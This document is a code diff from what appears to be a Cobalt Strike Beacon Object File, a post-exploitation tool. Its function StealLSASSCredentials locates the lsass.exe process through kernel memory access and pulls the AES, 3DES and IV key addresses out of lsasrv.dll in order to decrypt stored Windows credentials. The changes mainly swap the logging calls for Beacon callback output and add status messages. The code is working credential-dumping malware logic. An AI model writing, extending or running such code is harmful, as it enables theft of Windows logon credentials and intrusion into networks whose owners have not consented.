@@ -139,27 +139,31 @@ unsigned char* RetrieveBCryptKey(HANDLE hFile, DWORD64 bCryptHandleKey, DWORD lo
 
 BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials)
 {
-    BeaconFormatPrintf(&outputbuffer, "[+] Stealing LSASS Credentials!\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Stealing LSASS Credentials!\n");
 
     DWORD LsassPID = GetTargetProcessInformation(L"lsass.exe");
     if (LsassPID == 0)
     {
-        BeaconFormatPrintf(&outputbuffer, "Invalid LSASS PID! Returning...\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get LSASS PID!\n");
         return FALSE;
     }
-    BeaconFormatPrintf(&outputbuffer, "[+] Lsass PID: %d\n", LsassPID);
-    
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Lsass PID: %d\n", LsassPID);
+
     // Get LSASS EPROCESS address
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Locating LSASS EPROCESS...\n");
     DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile);
     DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA, dBuildNumber);
     if (LsassEprocessVA == 0)
-       return FALSE;
+    {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get LSASS EPROCESS address!\n");
+        return FALSE;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS EPROCESS VA: 0x%llx\n", LsassEprocessVA);
 
-        
+
     DWORD lower32bits = (DWORD)LsassEprocessVA;
 
-    // Retrieve & Display Credential Data
-    BeaconFormatPrintf(&outputbuffer, "\n===== [ Credential Data ] =====\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Searching for credential keys in lsasrv.dll...\n");
 
     DWORD64 hAesKeyAddress = 0;
     DWORD64 h3DesKeyAddress = 0;
@@ -168,28 +172,29 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
     HMODULE hModule = LoadLibraryA("lsasrv.dll");
     if (!SearchForCredentialKeys(dBuildNumber, &hAesKeyAddress, &h3DesKeyAddress, &IVAddress))
     {
-        BeaconFormatPrintf(&outputbuffer, "[!] Failed to find credential keys!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to find credential keys!\n");
         return FALSE;
     }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found credential key addresses.\n");
 
     DWORD64 hAesKeyPhysicalAddress = 0;
     if (!TranslateUVA2Physical(hAesKeyAddress, &hAesKeyPhysicalAddress, lower32bits, LsassPID))
     {
-        BeaconFormatPrintf(&outputbuffer, "[!] AES Key has invalid address!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] AES Key has invalid address!\n");
         return FALSE;
     }
 
     DWORD64 h3DesKeyPhysicalAddress = 0;
     if (!TranslateUVA2Physical(h3DesKeyAddress, &h3DesKeyPhysicalAddress, lower32bits, LsassPID))
     {
-        BeaconFormatPrintf(&outputbuffer, "[!] 3Des Key has invalid address!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] 3DES Key has invalid address!\n");
         return FALSE;
     }
 
     DWORD64 IVPhysicalAddress = 0;
     if (!TranslateUVA2Physical(IVAddress, &IVPhysicalAddress, lower32bits, LsassPID))
     {
-        BeaconFormatPrintf(&outputbuffer, "[!] IV has invalid address!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] IV has invalid address!\n");
         return FALSE;
     }
 
